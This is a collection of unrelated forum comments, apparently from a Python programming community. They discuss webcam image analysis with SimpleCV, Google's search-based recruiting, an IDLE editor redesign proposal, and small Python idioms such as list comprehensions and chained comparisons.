And I thought *I* liked contrasty colours.
I don't understand your question. What do you mean by "analyzing data directly from a webcam to a coding language"? What's the expected input and what are you trying to achieve? Edit: For image analysis from webcam feed, I personally use SimpleCV. It's based on OpenCV and you can mix and match it with OpenCV functions. OpenCV doesn't really have a good beginner tutorial for its Python API so it might be a little hard to get a hang of it in the beginning. SimpleCV, on the other hand, has excellent video and text tutorials. This might be helpful: http://pyvideo.org/video/1796/simplecv-computer-vision-using-python
Eh, configuration files often have some interdependencies so tracking only a single file seems less than desirable. For example, your shell rc may try to call a script in your ~/bin folder, but if you're not tracking scripts in the same repo you just made things more complicated.
What about using Numba?
Yes, I'm looking for something that gets me closer to ML style functional programming.
Weirldy, I had the same problem. I clicked away, and couldn't get it to tell me that there was an update again. I ended up just downloading the tgz and installing it manually, which is pretty painless anyway.
Maybe they employ some advanced analytic that also looks at how much time you spend on reddit (the non-programming parts). This is what I'm assuming in my case.
Pics or it didn't happen.
hey sorry if the question is confusing. i mean the following use case: 1 - have a webcam that can capture video 2 - have the webcam feed the video into a laptop 3 - have python read that feed, and determine something from the feed (is it a human, etc). i know these are not easy questions to answer, but i would like to experiment in my free time. thanks for pyvideo/simplecv will definitely loook.
Oh then SimpleCV would be perfect for your case. For 1, 2: http://tutorial.simplecv.org/en/latest/examples/interacting-with-the-display.html The book on SimpleCV is really easy to understand too (very minimal math and intuitive). Have fun and good luck! 
Cue people googling like crazy for programming languages they know. 
Same here. I've gotten to the point where I literally wanted to find info on soap, and Google gave me the Wikipedia article on Simple Object Access Protocol. 
On removing vowels, you don't need to wrap it into a list: vowels = 'aeiou' nonvowels = ''.join(l for l in sentence if not l in vowels) If just using generators is fine I have this function for finding the hamming distance between two equal length strings: def distance(string1, string2): return sum(char1 != char2 for char1, char2 in zip(string1, string2)) If you don't want to assume they are of equal length, you could use izip_longest in itertools instead.
&gt;Google, just like other employers, is having trouble finding good Python programmers, but it may not take much training to become one. “There are people out there who work a 9-to-5 job who are maybe called analyst but maybe are [one] course away from being an open source developer. They may have awesome Microsoft Access skills or they understand a little bit of programming, but they need that next step to push them,” Calvin Hendryx-Parker told the Indianapolis Star. \**bangs head in to wall*\*
If so, why?
&gt; it may not take much training to become one When google says "good python programmers" they do not mean "figured out how to code python"..they likely mean actual experience with very large, scalable, maintainable, python codebases.
golang
I was the programmer for the Beemo app that's in the iOS app store (designed by Cartoon Network and Ham in the Fridge). The entire app was written with JavaScript, HTML, and CSS. If you wanted to make yourself your own Beemo, I definitely think it would be a fun project for you. Good luck! Here's a little write up I did about the project: http://www.zachstronaut.com/posts/2013/07/24/beemo-ios-app.html
Great example. I'll add this one to the list.
Right, that's why the quote is so annoying. "If you're an Access power user or have compiled Hello World in Java, you're just a course away from becoming a Google-class software engineer!"
&gt;OSX and Linux are supported. I knew this would be something that would be too good to be true for Windows.
There is some Python floating around, but anything of consequence is in C++ or Java, with Go here and there. They will let you interview partially in Python, but at least some of the interviews must be in C++ or Java.
This was my red flag. Wouldn't it be better just to teach a skilled Python programmer Access? 
To clarify, the second version gets the relative paths, correct?
Performance. The productivity gain of Python over say, C++, is small compared to the cost savings of having more performant code at the scale Google operates at.
Google does not have more money than any bank on earth. 
Ok, thanks, just confirming!
[Or teach Astronauts to drill?](http://www.imdb.com/title/tt0120591/trivia?item=tr0752053)
Would you mind elaborating on how this could be done?
I can rule out #2--I don't have search history turned on, but I got the message. I believe I was searching for "Python lambda" when it came up.
http://www.statista.com/statistics/263264/top-companies-in-the-world-by-market-value/
You are welcome, it's an interesting collection you are compiling there :)
I think that's illegal, not to say it doesn't happen constantly.
My advice would be to ignore the spiel - though have a look at http://www.bath.ac.uk/students/careers/employer/index.html Instead talk to them, meet then and get them...
&gt; I'm sure some will spend enough time learning and customizing vim or the like to have similar features, but it doesn't make sense to me to do that when PyCharm is built for that kind of thing, and does it very well. It doesn't make sense to spend a few hours grabbing some plugins to do all those things but it does make sense to learn an entire new workflow? I don't understand that mindset.
Sadly it's missing a bunch of packages I need (psycopg or pg8000, Mako, uwsgi, etc...). Thanks for mentioning it though, I had never heard of it.
First off, there's a subreddit for this: http://www.reddit.com/r/learnpython Second off, that subreddit wants you to have put some effort to researching the topic on your own first; The best place to start is google
Sequences support len(seq) whereas iterables don't. I sometimes use a generator comprehension(not a list comprehension) as an argument to sum() to determine the length: length_of_iterable = sum(1 for _ in iterable) Of course, this will never terminate if iterable is infinite. 
something other than "recruiters calling you like debt collectors"?
&gt;*bangs head in to wall* Yeah, I too once had to use Microsoft Access. I'm better now.
Teaching a Python programmer Access is like teaching a Nascar driver how to ride a tricycle.
The article mentions needing search history turned on.
I don't know. Some banks manage trillions. Yes, Google has a lot of value, but I'm sure there are banks out there with more.
I'm not sure you are on the right track here. I will try to inline some comments below. &gt;I’ve started a wiki for an IDLE redesign project: http://idle-reimagined.wikia.com/wiki/Idle_Reimagined_Wiki I'm all for improvements. &gt;If you would like to help, please join the mailing list: https://groups.google.com/forum/#!forum/idle-reimagined/ &gt;IDLE Reimagined mockup screenshot &gt;From the wiki: &gt;IDLE Reimagined is the code name for a redesign for Python’s default IDLE editor with focus as an educational tool. IDLE’s chief utility is that it comes installed with Python, making it simple for newbies to start programming. But professional software developers don’t use IDLE as their IDE. Instead of turning IDLE into a sophisticated IDE for professional software developers, it can be tooled with features specifically to make it friendly to those learning to program. I actually believe excessive focus on beginners is a mistake, a huge mistake really. I don't consider myself to be an accomplished software developer nor a programmer with extensive Python experience. However when actually using Python I prefer PyDev and of course Eclipse which I also recommend to beginners. Why? Because the same features that help professional developers help more casual developers. The other really good and up and coming option is iPython and the notebook metaphor. Now the last thing we want to do is to turn IDLE into PyDev. However that doesn't mean we should avoid the helpful features that advanced editors offer. &gt;Prime Directives for the new design: &gt;IR is designed not for experienced developers or those new to Python, but specifically for those new to programming. That right there seems to be a mistake to me. It would be better to focus on enhancements that make it a better editor for everybody. &gt;IR is meant to be a drop-in replacement of IDLE, and be installed with the default Python installer. Well anything that installs properly with pip is fine with me. However how do the IDLE maintainers feel about this? I assume the eventual goal is the complete replacement of IDLE. If not you may end up with very low exposure. &gt;IR’s code will use the tkinter GUI toolkit (unless a better GUI toolkit is bundled with Python). Tkinter is fine and in fact I'd have zero interest in any thing else. If the idea is simple clean installations then I see tkinter as a requirement. Many will whine to the contrary but tkinter has proved itself many times and is the default GUI kit. &gt;IR is fully-featured offline, but also has features for finding help or sharing code online. Honestly I'd worry about that after getting the whole packaged debugged and delivering basic features. In fact you would be spinning your wheels here as any decent computer already comes with a web browser. Wasting energy on features better supported by other software is never a good idea. &gt;“Simple is better than complex.” Most of the time yes. Sometimes Eclipses complexity is an issue, however that same complexity makes PyDev a very useful environment for a novice. &gt;These are the features that will distinguish IR and make it a good candidate to replace IDLE: &gt;Single window design, with file editor on the upper pane and interactive shell on the lower pane. (No more confusing separate windows for shell &amp; file editor.) I'm not sure it is all that confusing. The bigger problem is threading within Python, I'm not sure you can easily deliver the interactive nature of a good editor with Python. It is no surprise at all that modern editors are built from languages that support threading well &gt;Tabbed file editor. I generally like this approach. &gt;Foreign language support. (Though Python’s keywords and standard library will still be in English, IDLE itself can be multi-lingual.) I'm an American as such I don't care about foreign languages. If you can pull it off without negative impact on the editor that is fine but in general I don't see the overhead as worth it. &gt;Tutorial plugin system for Codecademy-like tutorials. It is an editor why would you do that? &gt;Integrated pip installer. That makes no sense either. Especially for a beginner that shouldn't have to install anything at first. Later when packages do have to be installed he should take the opportunity to learn to do it the right way. &gt;Integrated pastebin feature. (Easily share code with those who can help you.) I could see where that might work out well. Frankly the ability to E-Mail code might work out well too. The problem with either of these approaches though is that you get back to the idea that there are better ways to do these things on most systems. You might ask your self if you are writing a replacement for IDLE or EMACS. &gt;“Plain English” error message translations. Instant Google-search for error messages. Well I'm all for good error messages though that might require rewriting Pythin. As for Google I'm back to the idea that there are better ways to search through Google. &gt;Detects and warns if you are trying to run Python 2 code on Python 3. This one I have a massive problem with. Anything new editor wise should be Python 3 focused. As for old code that should be generating errors already in Python 3. At best a tweaking to the error messages might be in order. &gt;Lightweight real-time lint tool that will point out missing variables and syntax errors. (Checks for errors, but does not check for style or PEP8.) The CLang/LLVM project as soundly demonstrated the importance of tools to check your code. I would place far more effort on these sorts of tools then some of the tricks you outline above. For example checking for style can be educational especially if you support more than one style. Static checkers like CLang provides might be a bit harder, however the ability to take an HTML file that is the result of a static checker run and send it to somebody has worked out very well for me. I've actually helped people find bugs in large code bases this way and I had zero familiarity with those code bases. Now the thing here is that not all of your tools need to be real time. However a specific developer might not want to have one or more of them running at the same time. So these tools would need to be allowed to be shut off when not wanted. Support for non realtime tools should not be forgotten. In the end it all comes down to performance and your ability to get Python to work well with all of these threads. I think the trick here is providing various levels of support for real time checking and balancing that with other useful interactive editor features. One last thing, if you have access to a Mac look at the latest version of XCode for some ideas as to how a nice IDE/editor could work for Python. XCode for years was a bit clunky but has gone through a major overhaul in the 6 version. Also it might suggest to you that a GUI builder for tkinter might be a good idea. Ultimately beginners want to build gui based apps, at least most I run into do. As such it might make a lot of sense to have a gui designer for tkinter built in. In the end a GUI designer might give the editor enough creed in the community to get more than a couple of developers on board. Along these lines, always consider what is happening with other IDEs, editors and new ideas like iPython. For example iPython has gotten real good of late and in some cases would be worth recommending as a platform for beginners. This isn't a one size fits all world. 
Great example. I'll try to implement this shortly.
Not everything Google produces is necessarily required to scale to Gmail level. They have a lot of internal products, prototypes, and lesser used features that may use scripting languages like Python instead of C++. Python is also one of the accepted Google languages that employees use for their 20% time and such.
No, Google has [$125 billion](https://www.google.com/finance?q=NASDAQ%3AGOOG&amp;fstype=ii&amp;ei=1VhuVOHcKomdsQeB7oGYAg) in assets. One of the big banks like Wells Fargo has [$1.6 *trillion*](https://www.google.com/finance?q=NYSE%3AWFC&amp;fstype=ii&amp;ei=D1luVPGSM-bVsgfIjoFI) in assets.
Google has ~ $125 billion in assets. Not bad. Goldman Sachs has ~ $868 billion in assets. [GOOG](https://www.google.com/finance?q=NASDAQ:GOOG&amp;fstype=ii) [GS](https://finance.yahoo.com/q/bs?s=GS) So no, Google does not have more money than *that* bank, in terms of assets. Further, Google has ~ $6 billion in cash, while GS has ~ $224 billion in cash. Google loses that one too. 
I will expand slightly on /u/TheKewlStore to give you some terms to lookup. * web scraping * requests * beautifulsoup 
This is not really new....The only thing that was new was the HN post about it and how that poster got there. Maybe the puzzles are new but they have always had keywords linked to a recruiting type page.
Show me how pls... 
just in case, someone is wondering ... C:\&gt;python -V Python 2.7.8 C:\&gt;python -m timeit "set(x for x in range(10000))" 1000 loops, best of 3: 1 msec per loop C:\&gt;python -m timeit "{x for x in range(10000)}" 1000 loops, best of 3: 671 usec per loop 
This article probably ruins the whole thing for Google. They're going to have to find a different way now.
Nope. That would be like saying that college recruiting events are illegal. While hiring by age is illegal, this scenario of recruiting a targeted audience is not.
I sometime wonder if all the money/time they spend on recruiting would be better suited simply for training.
Maybe you can clarify something for me as business stuff isn't my strong suit. Does GS have $224 billion of their own money or other peoples? If it's other peoples then don't *they* have less than Google? If not then why is a company with that much money only worth $75 billion?
I've listed some of the properties of IDLEX that I'd like to see in IR here: http://idle-reimagined.wikia.com/wiki/Influences#IDLEX IDLEX has some improvements over IDLE, but it still retains the confusing multi-window design for the interactive shell and files. The UI has some unintuitive complexities, such as the "RS / RSP / RA" buttons and the "subcode" concepts at the top of the file editor (no clue what those mean). It looks like features were glued onto IDLE, rather than thinking about how they affected the overall workflow. My personal opinion is that IDLEX is trying to do something different than what IR's objectives are.
I'd be happy to help clarify. I have a master's in finance and economics so that is sort of in my wheelhouse, although accounting was my least favorite class haha. That cash figure I cited is an asset on GS's book. Because it's an asset, they get to treat it like their cash regardless of where it came from. If it was someone else's cash that they had to pay back, it would show up as a liability on the balance sheet. Also, Goldman Sachs is an investment bank and doesn't function like a traditional bank, where they take in deposits and make loans. Does that answer your question?
I am
So if I write a Python script to Google Python related searches, will I get a Google job?
Just about, last question, if they have that much in assets, and don't owe it to anyone else why is their value far under that? It doesn't make sense to me that a company would have more money than its worth, I'd imagine that would go into the overall worth.
The hiring process is so fucked. Ive been asked questions that I couldnt answer off the top of my head in an interview, but I know if I had a PC in front of me I could find a solution. Now google wants to interview based on search but they wont have search available during the interviews. Fuck, will companies make up their minds? 
What's the difference between making it available as a pip package and a conda package?
You'll get to apply, at least. Maybe.
&gt; However when actually using Python I prefer PyDev and of course Eclipse which I also recommend to beginners. In this case, those beginners can just use Eclipse &amp; PyDev. The point of IR is to fill a niche that doesn't exist. &gt; &gt; IR is designed not for experienced developers or those new to Python, but specifically for those new to programming. &gt; That right there seems to be a mistake to me. It would be better to focus on enhancements that make it a better editor for everybody. These kinds of editors already exist in things like Eclipse and PyCharm. &gt; Many will whine to the contrary but tkinter has proved itself many times and is the default GUI kit. I disagree, and many others do too. tkinter is complicated and difficult to learn. "wxPython is the best and most mature cross-platform GUI toolkit, given a number of constraints. The only reason wxPython isn't the standard Python GUI toolkit is that Tkinter was there first." -Guido van Rossum http://www.wxpython.org/quotes.php The only reason I'd like to implement this with tkinter is because that's the only GUI toolkit that comes with Python, and introducing a brand new GUI toolkit to be bundled with Python would introduce far too many new issues. &gt; I'm an American as such I don't care about foreign languages. This is not a good argument. &gt; Integrated pip installer. &gt; &gt; That makes no sense either. Especially for a beginner that shouldn't have to install anything at first. Having written many Python tutorials, one stumbling block I find is having to explain how to bring up a terminal window, cd to the correct folder/directory (and explaining that "directory" is an older term for folder which is why it's "cd" and not "cf"), mind that different versions of Python can be installed to different folders, then running pip (don't forget sudo if you are on mac or linux) is extremely tedious. (Especially for three sets of instructions for Windows, OS X, and Linux). It'd be great if there was a simple GUI to handle this. &gt; I could see where that might work out well. Frankly the ability to E-Mail code might work out well too. The problem with either of these approaches though is that you get back to the idea that there are better ways to do these things on most systems. You might ask your self if you are writing a replacement for IDLE or EMACS. This is one of those advanced features that would have to be designed carefully to prevent it from being overbloated. I envision on the IR side that it would just be a "Share this code" button that would handle uploading the file (either to pastebin.com or a similar service on python.org) which returns a simple URL. There could be a small settings GUI to find previously shared files and also have a delete button to remove them from the web. The problem with sharing Python code over email is that even if you get the indentation formatting correct, the recipient's client could still mess it up. It would also require the recipient to highlight and copy the code from their email client, introducing another place where they might screw up the indentation by not highlighting from the start of a line. Also, SMTP configuration is a pain, and there would also be firewall issues to deal with. &gt; Well I'm all for good error messages though that might require rewriting Pythin. As for Google I'm back to the idea that there are better ways to search through Google. I should change the wiki to say "web search" instead of "Google" (though Google will probably be the default search engine). And this wouldn't be replacing the error messages in Python, but rather adding optional additional text when a traceback is displayed. &gt; Static checkers like CLang provides might be a bit harder, however the ability to take an HTML file that is the result of a static checker run and send it to somebody has worked out very well for me. I was envisioning something far more simple. I use a real time lint tool in my editor that highlights lines to point out mistakes as I type them, rather than waiting until I run the code, get an error message, read the line number, and then go back to the file editor and scroll to the line. This would catch only common simple errors, such as syntax errors or typo'd variable names. Having this reported in real time removes the frustrating moment that comes when you press F5 expecting the program to work and are greeted with an error instead. 
It does a bit, thanks for the answer. It is weird that a company's market worth (the cost of all of the shares) would be less than the company has in assets. It would seem like if I had 80 billion and somehow I could magically buy all the shares I would then be in possession of a company with a lot more value than I put in and I could sell off assets to recoup and make a profit. I am sure it is much more complex than that and not the correct way of thinking but just what it makes me think of. 
I don't think I'll make many enemies on Reddit by saying that PHP is... less than ideal. But the reason PHP became so popular in spite of being a terrible language was that it was **easy to set up** and **easy to get started**. That's the great thing about IDLE: it's an IDE that comes with Python. Python tutorials don't have to have separate install steps, or steps about how to run Python scripts from a terminal (which have to be in triplicate to cover Windows, Mac, and Linux). The other great thing about IDLE: It's such a humdrum IDE that no professional developers use it, so there's no existing user base that won't like education-centric design choices. I've taught some Python classes to beginners, and what's nice about using IDLE is I know that they won't have much problems downloading and installing it at home, no matter what their OS or setup is. Having IDLE is a huge boon for growing the Python community.
Absolutely. I have long wanted IDLE to be a 'newcomers IDE', like the QBasic editor in which I started programming. I will be watching (and helping, if I have time) with considerable interest.
I'd like to introduce virtualenv-mgr (https://github.com/arteria/virtualenv-mgr) at this point. virtualenv-mgr is a tool to manage multiple virtualenvs at once. Simply install, uninstall or upgrade specific packages in all virtualenvs at once. Print statistic, about the usage of packages over all environments. Find/list virtualenvs for further processing, eg. as input for virtualenv-mgr. Find all envs having a package installed. 
Do you use adblock?
Now you're thinking like a corporate raider! The thing is, the stock market tries to encapsulate a company's value but almost always fails. So when you see one company attempt to buy another publicly traded company, they will put in an offer to buy a controlling stake for a lump sum of money. For instance, Halliburton just purchased Baker-Hughes. At the time, Baker-Hughes was trading at ~63 dollars and Halliburton offered to buy it at ~$80 per share, effectively changing BH's valuation. Because stock price can be impacted by any number of things, it's generally a poor representation of a company's health. 
Actually this nonsense is good enough reason to reject Google as a place to work. I really don't need Google to parse my searches for whatever despicable interest they may have at the time. It is just another example of Google cavalier attitude to people's rights and privacy. 
FYI google has become more lax on their hiring in recent years
This is from the east coast but I have to say that these days companies don't give a crap about training or keeping employees skills up to date. They would rather fire dated people and employ new graduates. 
Yes! And what's great is, since no experienced developers use IDLE (they'll use a real IDE/editor like PyCharm or Eclipse or Vim), a new IDLE wouldn't have to cater to experts at all.
you still look into the documentation sometimes how that specific function works... quickest way? Google.
Reliant Robin?
at Google? Yeah, to look if you have found some depraved shit they haven't found yet, since they have seen everything else already.
Nice start! To be honest I haven't used this technique often but this article already suggest that I should. 
Did you tell them you had to search for some details to be able answer it, or did you tell them you didn't know.
Best of luck on your weird-ass metaprogramming journey, then.
Do you have any documentation? I have no reason to disagree, just curious.
Have you considered that you might be unrealistic here? A good developer, that understands something like C++ will get onboard a lot faster than a new guy that is just starting his career with Python. Honestly everything about your responses indicates to me that you are looking for something for nothing. This generally results in a reputation building up in the local community. As a side note the local university here has a good CS program. One business I'm familiar with hires students from this college and pays them a very good rate, sometimes to the extent that the students are some of the higher income makers at this business. Why? Because they are worth it for his specific business. Also that means a steady stream of talented individuals that need to work their way through school. In any event try being a little more openminded when it comes to sourcing talent. 
then don't use their search engine
Cool! I'll definitely add those codes. thanks
It seems it may be an undocumented quirk: http://stackoverflow.com/a/9061024 I couldn't find a mention of it on the official Python documentation. I can't dive into the c code right now to check it out, but if someone else does they look at the code here on line 1574: http://svn.python.org/view/python/trunk/Objects/stringobject.c?view=markup Join does seem to iterate twice skimming over it (as suggested in the above Stack Overflow article) FWIW I was able to reproduce Raymond's results locally
Possible/legal for Google to use search history mining in the recruitment process? The amount of data they hold on you...
It's not a secret. They're wealthy. That's a fantastic recruiting tool. 
I used some magic from imp to load modules dynamically from a specified directory in my IRC bot. Your plan is not a bad one. Relevant code is in load_modules(); starts at line [194](http://bits.zero9f9.com/pybot/src/71fe07c85cab0689f07dcbf9883762e2fd9129f2/bot.py?at=master#cl-194).
I had to read this several times over before realizing when you wrote "soap", you didn't actually mean SOAP but what I used to bathe with this morning.
Excellent. Thanks for sharing the link. I'll update with this exception.
And fabric still doesn't work with python 3, which makes so many people sad
I think either the `or` or the three-element comparison would be considered Pythonic. The last version is not Pythonic and is also much more inefficient than the other two since you're comparing `age` to every element in the list or generator that `range` gives you.
wonder if the frequency of the word 'boobs' in my history was the problem.
Haha, I knew this would come up. Since it's a huge company it's probably something like: if not googLib.isAgentValidYoung(agent.guessedAge(),agent.guessedCountry()): agent.setDisqualified(True,'old fogey', 0 , 1.5) agent.adPreference.set(googSponsors.apparel.adultDiapers, True) 
Not sure this format and speed is good for people completely new to programming. I think this style and speed is good for people who already learned Python, but maybe took a break from it and need a quick refresher.
&gt; if age not in range(18, 32): disqualify() I'd avoid this as it doesn't work if `age` turns out to be non-integer: &gt;&gt;&gt; 19.5 not in range(18, 32) True Even if I know `age` is an integer *now*, the code is more fragile, and so I'd go with relational comparisons. BTW, both of your checks have an off-by-one error: &gt;&gt;&gt; age = 32 &gt;&gt;&gt; age &lt; 17 or age &gt; 32 False &gt;&gt;&gt; not 17 &lt; age &lt; 32 True &gt;&gt;&gt; age not in range(18, 32) True
Mr Sweigart, you amaze me. Your relentless commitment to teaching and passing your knowledge is very commendable. I wish this project much success!
I use list comprehensions to turn CSVs into a listed dictionary import csv data = [ x for x in csv.DictReader(open('foo.csv', 'rU))] 
This is much simpler: def outer(*parms): class nonlocal: a = 42 b = 69 def inner(*args): nonlocal.a += 1 nonlocal.b *= 2 inner() print nonlocal.a, nonlocal.b Explicit is better than implicit, as they say. 
Looking up shit in Haskell gets you taunts from google. They actually ring you up.
God. I wonder if Googlers scan through my search history if I looked up any odd searches. 
 &gt;I generally agree with you that newcomers are better off starting with real tools than toys (e.g. Python over Scratch). But I don't think that applies to IDEs. I now use Pycharm, and it has a lot of very helpful features, but I think those same features are confusing and offputting for newcomers. Confusion certainly is a problem with some IDE's. The goal would be a design that is straight forward for beginners but offers power once it is needed. If you want zero confusion a terminal editor, like VIM with most of the capability stripped out would leave little to confuse people. We really don't want to go that far backwards here though. &gt;I started programming in QBasic. In the editor (blue and white, no highlighting), you wrote your code and pressed F5 to run it. At the bottom of the screen was the 'immediate window' for trying out commands without saving them. Marvellously simple. I would love to see IDLE be a modern(ish) version of that for Python. I remember that old editor myself. The thing is I really believe we can do much better with good UI design than that. Part of that design would be to deliver good powerful features with a minimal of complexity for the novice user. One thing I hate about Eclipse/PyDev is right or left clicking on something and ending up with a menu that is higher than my screen. That is poor design in my mind, it might work after you get use to it but it isn't suitable for a beginner. In a nut shell the goal should be to find the proper balance between ease of use and the ability to support advanced features. &gt;I work on IPython, and we do teach beginners Python using it, in things like Software Carpentry courses aimed at graduate students. But it has drawbacks too, mainly related to the fact that it's not *just* Python. If IDLE Reimagined takes off, I would probably recommend that for people learning by themselves, but possibly use IPython when we're teaching people, so we can help them understand what's going on. I mentioned iPython not so much as to suggest duplicating it but rather to expose one to new ideas in how one programs. The reality here is that the world has literally dozens of text editors and IDE's out there all basically doing the same thing. If one is to invest time developing a new editor I really see a need to innovate and embrace new. 
Can't beat Codecademy, though IMO their Python track is not the best.
http://www.google.com/foobar/
I haven't had any problems with this. Did you setup the project as a Django project in PyCharm?
I wouldn't really say so...
From what I recall they track it by flagging the URL variables, which I think follow the '?' in a search. 
 &gt;In this case, those beginners can just use Eclipse &amp; PyDev. The point of IR is to fill a niche that doesn't exist. I understand to an extent but there are hundreds of simple text editors out there some even do Python well. IDLE itself is already pretty simple. The only real reason I see to mess with IDLE would be to make it more powerful in its Python focus. By the way being completely focused on one language isn't a good idea either, it wouldn't hurt one bit to be able to handle HTML/CSS files and plain text files well. Being to strongly focused on one language / file type is basically death for an editor and I would suspect that this is perhaps the biggest reason IDLE isn't used much. Even a beginner needs some flexibility. &gt;These kinds of editors already exist in things like Eclipse and PyCharm. True? But that doesn't mean there isn't a half way point for a Python editor. &gt;I disagree, and many others do too. tkinter is complicated and difficult to learn. Well we will have to disagree on that one. That may be due to its fitting my minds way of doing things. For example I have never enjoyed Apples approach to Cocoa as the SDK just rubs me the wrong way, but many swear by the approach that Apple took. In any event the reason to use tkinter is simple, it comes with every Python install and is good bough for teaching. You really don't want people installing third party SDKs &gt;The only reason I'd like to implement this with tkinter is because that's the only GUI toolkit that comes with Python, and introducing a brand new GUI toolkit to be bundled with Python would introduce far too many new issues. Exactly! Keep everything Python native. &gt;This is not a good argument. No probably not but the reality is a lot of time gets wasted on multi language support. &gt;Having written many Python tutorials, one stumbling block I find is having to explain how to bring up a terminal window, cd to the correct folder/directory (and explaining that "directory" is an older term for folder which is why it's "cd" and not "cf"), mind that different versions of Python can be installed to different folders, then running pip (don't forget sudo if you are on mac or linux) is extremely tedious. (Especially for three sets of instructions for Windows, OS X, and Linux). It'd be great if there was a simple GUI to handle this. I see your point but teaching Python shouldn't be an effort in teaching computer literacy. Let's face it if you really want to develop programmers, they will need to learn the ins and outs of computer operating systems. It just hit me that what you may actually want here is not so much an app but a bundle to steal slightly a Mac term. That is one package that contains Python and everything else needed that gets installed in such a way that nothing system wise get clobbered. The idea being that this installation can be modified to the beginners content and blown away when no longer needed. At least this way you would have little impact on the computers system. I never got into Virtual Environment but the idea is similar here and does have some advantages. You produce an app that keeps itself isolated from all other parts of the system through updates and library additions. &gt;This is one of those advanced features that would have to be designed carefully to prevent it from being overbloated. I envision on the IR side that it would just be a "Share this code" button that would handle uploading the file (either to pastebin.com or a similar service on python.org) which returns a simple URL. There could be a small settings GUI to find previously shared files and also have a delete button to remove them from the web. This would be an interesting feature. Sharing code fragments is a very useful way to learn. The trick as you state would be to avoid bloat and functionality that might work better elsewhere. One of the things I hate about EMACS is that there is a mode for everything and unless you sue EMACS daily there is almost no way to use those features casually. &gt;The problem with sharing Python code over email is that even if you get the indentation formatting correct, the recipient's client could still mess it up. It would also require the recipient to highlight and copy the code from their email client, introducing another place where they might screw up the indentation by not highlighting from the start of a line. Also, SMTP configuration is a pain, and there would also be firewall issues to deal with. You are right on all counts there but then again I've had editors (transferring between sources) screw up Python indentation many times on me. That has lead to some ugly debug sessions. Your best bet with E-Mail is to include an attachment. I wouldn't rush either feature into the first release though. The reasoning here is pretty simple, there are ways to accomplish the task without the feature that are easy enough to grasp. &gt;I should change the wiki to say "web search" instead of "Google" (though Google will probably be the default search engine). And this wouldn't be replacing the error messages in Python, but rather adding optional additional text when a traceback is displayed. In the end if it doesn't compromised the editor when no internet connection is available it probably won't harm anything. However a slow net connection can make for a miserable editor experience that a newbie might not be aware of. &gt;I was envisioning something far more simple. I use a real time lint tool in my editor that highlights lines to point out mistakes as I type them, rather than waiting until I run the code, get an error message, read the line number, and then go back to the file editor and scroll to the line. This would catch only common simple errors, such as syntax errors or typo'd variable names. That is perfectly fine. Maybe I didn't state my point well but the idea is that you would have levels of capability. A stand alone report is very interesting from,the learning standpoint. &gt;Having this reported in real time removes the frustrating moment that comes when you press F5 expecting the program to work and are greeted with an error instead. Yep! I'm not disagreeing with the idea but rather suggesting that options are nice. 
You definitely don't have to interview in c++ or java.
I think it's more of an issue that python does *not* have a productivity gain for large systems. I love python for small projects, but it's not the right tool for huge stuff. You lose all the productivity that was gained and more when you have every new developer trying to decipher the type system and code structure of someone else's huge dynamically typed program or library unless it's documented heavily enough that it's basically java.
Maybe it varies by office, but within the last 6 months, at one of the satellite offices, doing whiteboard interviews only in python was not an option.
Example 3 should use a set instead of a list for `noprimes`. Otherwise, the algorithm takes O(n^2) time.
I hope no one misunderstands my other comments but I figured I might sum things up here. We have literally hundreds of text editors out there, many that can handle Python very well already. So that to me puts anything new to displace IDLE in a tough league as there are already many easy to use IDE/editors out there. As such this editor would need to be materially better than anything else out there for Python development. Of course their are different "scales" but I suspect that the best term here is a light weight IDE. The question then becomes is there enough interest to create a from the bottom up, dedicated IDE for Python. I'm not convinced really, especially if the aim is an IDLE replacement. The other thing is that some of the frustration listed with respect to current IDLE are really teaching problems. I don't see a new editor getting completely away from that reality. You will just trade one form of student stumbling for another. In some cases you would be better off letting the students stumble a bit. An exercise for the reader if you will😜😜. I'm strong believer in putting students in a position where they have to think and solve problems on their own. So while I'm not against a better IDLE I'm not convinced that making another simple editor is the way to go here. 
whenever I do that, I usually just take the 1st or second result and never look further
Google knows you did lots of Python searches a dozen years ago, so you're an experienced programmer :-)
you just can't discriminate against those over 55 i think, if you are 40 they can pass you over based on age
Any time you have `[x for x in thing]` you can just replace it with `list(thing)`. It's only when you add map or filter operations that list comprehensions save you space.
Run&gt;Python Engine&gt;Reinitialize Python Engine
I think this sends an unfortunate message to people though. Many people really suffer from the myth that they will "be discovered" someday by a mysterious stranger that will suddenly make life so much more pleasant. That's not real and it's problematic because when people believe it that they tend to have problems focusing on their own realistic goals because they assume that eventually someone will show them the way. Instead, you should be finding your own way. 
I did all of my interviews in Python.
Hell yeah ! Very cool post, thanks !
I appreciate reading this form of disagreement. It's rare but substantive, a pathos appeal, maybe. 
#
I'd like to see if I can do the quiz questions... Even though I don't want a job at Google. Maybe someone will capture the quiz when they are offered to take it and post it somewhere.
I'd say `17 &lt; age &lt; 32`, simply for the fact that it is probably the only language that supports that syntax and it's shorthand for the `x &lt; y and x &gt; z` syntax. Although sometimes I'd personally do `disqualify(age)` and stick the comparison logic in there if disqualify should always check age, then have it return True if `disqualify` happened. Depends how else you use disqualify. Generally if there's thorough comparisons and conditional checks that basically end up being the whole logic of it, I put all those in a function like `disqualify`, then break out the side effects into another function or functions. like if disqualify(age=candidate.age, skills=candidate.skills): interviewer.shake_hand(candidate) interviewer.send_email(candidate, 'so sorry. best of luck') I would like to know `disqualify` or a better named function will tell me if they *would* be disqualified without having side effects, so I can use it other places without modifying the `candidate` object at all. I'd rather have a function just tell me if conditions match, not check if they match then modify the object. I'm assuming `disqualify` would entail a lot more than checking `age`. Also assuming that `disqualify` conditional checks would be in more places than one, such as phone screening, in person interview, at resume read time, etc. The conditions for `disqualify` would be useful to have in one spot for multiple points in interview workflow. 
Thanks! Also dictionaries as switch-case is interesting idea.
You're probably right actually a lot of the other videos are more broken down, multi part deals but I guess I have always been an experienced programmer just looking at a new language when I have watched them not a true beginner. I find they quite polished and enjoyable to watch though.
You're building a comprehensive list of list comprehensions?
Why can't it be made to work on windows?
Thanks. Updated.
That is not quite the usual workflow with requires.io, unless you practice continuous deployment and have, as a consequence, pretty hardened continuous integration. When you opt-in for email notifications (or pull-requests) for instance, you have to manually update your dependencies (or merge the pull-requests), and deploy again to your servers. The general idea is to get notified when something is insecure (or simply outdated); how to act on this information is then up to you.
I found writing deployment code in Fabric made for more boilerplate code than using Ansible.
What kind of taunt do you mean? On what terms? I never got any!
Sorry, what *is* the 20th aphorism? I count 19.
Great video! Maybe a bit too fast for newcomers but worth to see!
The description of PEP20 reads, &gt;Long time Pythoneer Tim Peters succinctly channels the BDFL's guiding principles for Python's design into 20 aphorisms, only 19 of which have been written down.
